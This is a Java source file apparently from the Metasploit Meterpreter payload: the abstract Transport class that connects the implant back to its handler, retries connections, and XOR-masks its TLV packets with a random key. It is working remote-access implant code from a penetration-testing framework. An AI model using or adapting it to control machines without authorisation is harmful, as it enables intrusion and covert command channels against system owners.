package com.metasploit.meterpreter;

import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.OutputStream;
import java.io.IOException;

public abstract class Transport {
    public static final long MS = 1000L;

    private Transport prev;
    private Transport next;

    protected String url;
    protected long commTimeout;
    protected long retryTotal;
    protected long retryWait;

    protected abstract boolean tryConnect(Meterpreter met) throws IOException;

    public abstract int parseConfig(byte[] configuration, int offset);
    public abstract void bind(DataInputStream in, OutputStream rawOut);
    public abstract void disconnect();
    public abstract boolean dispatch(Meterpreter met);
    public abstract void writePacket(TLVPacket packet, int type) throws IOException;
    public abstract TLVPacket readPacket() throws IOException;
    public abstract boolean switchUri(String uri);

    protected Transport(String url) {
        this.url = url;
    }

    protected int parseTimeouts(byte[] configuration, int offset) {
        // starts with the comms timeout
        this.commTimeout = MS * Meterpreter.unpack32(configuration, offset);
        offset += 4;

        // then we have the retry total
        this.retryTotal = MS * Meterpreter.unpack32(configuration, offset);
        offset += 4;

        // then we have the retry wait
        this.retryWait = MS * Meterpreter.unpack32(configuration, offset);
        offset += 4;

        return offset;
    }

    protected TLVPacket readAndDecodePacket(DataInputStream in) throws IOException {
        int xorKey = in.readInt();
        int len = (in.readInt() ^ Integer.reverseBytes(xorKey)) - 8;
        int type = in.readInt();
        byte[] body = new byte[len];
        in.readFully(body);

        this.xorBytes(xorKey, body);

        ByteArrayInputStream byteStream = new ByteArrayInputStream(body);
        DataInputStream inputStream = new DataInputStream(byteStream);
        TLVPacket packet = new TLVPacket(inputStream, len);
        inputStream.close();

        return packet;
    }

    protected void encodePacketAndWrite(TLVPacket packet, int type, DataOutputStream out) throws IOException {
        int xorKey = randXorKey();
        byte[] data = packet.toByteArray();
        this.xorBytes(xorKey, data);
        synchronized (out) {
            out.writeInt(xorKey);
            out.writeInt((data.length + 8) ^ Integer.reverseBytes(xorKey));
            out.writeInt(type ^ Integer.reverseBytes(xorKey));
            out.write(data);
            out.flush();
        }
    }

    private int randXorKey() {
        return randByte()
            | randByte() << 8
            | randByte() << 16
            | randByte() << 24;
    }

    private int randByte() {
        // Forces a random number between 1 and 255 _inclusive_
        return 0xFF & (int)((Math.random() * 255) + 1);
    }

    private void xorBytes(int xorKey, byte[] bytes) {
        byte[] x = new byte[4];
        x[0] = (byte)(xorKey & 0xFF);
        x[1] = (byte)((xorKey >> 8) & 0xFF);
        x[2] = (byte)((xorKey >> 16) & 0xFF);
        x[3] = (byte)((xorKey >> 24) & 0xFF);

        for (int i = 0; i < bytes.length; ++i) {
            bytes[i] ^= x[i % x.length];
        }
    }

    public String getUrl() {
        return this.url;
    }

    public long getCommTimeout() {
        return this.commTimeout / MS;
    }

    public void setCommTimeout(long commTimeout) {
        this.commTimeout = commTimeout * MS;
    }

    public long getRetryTotal() {
        return this.retryTotal / MS;
    }

    public void setRetryTotal(long retryTotal) {
        this.retryTotal = retryTotal * MS;
    }

    public long getRetryWait() {
        return this.retryWait / MS;
    }

    public void setRetryWait(long retryWait) {
        this.retryWait = retryWait * MS;
    }

    public boolean connect(Meterpreter met) {
        long lastAttempt = System.currentTimeMillis();

        while (System.currentTimeMillis() < lastAttempt + this.retryTotal) {
            try {
                if (this.tryConnect(met)) {
                    return true;
                }
            } catch (Exception e) {
            }

            met.sleep(this.retryWait);
        }

        return false;
    }

    public void setPrev(Transport t) {
        this.prev = t;
    }

    public void setNext(Transport t) {
        this.next = t;
    }

    public Transport getPrev() {
        return this.prev;
    }

    public Transport getNext() {
        return this.next;
    }
}

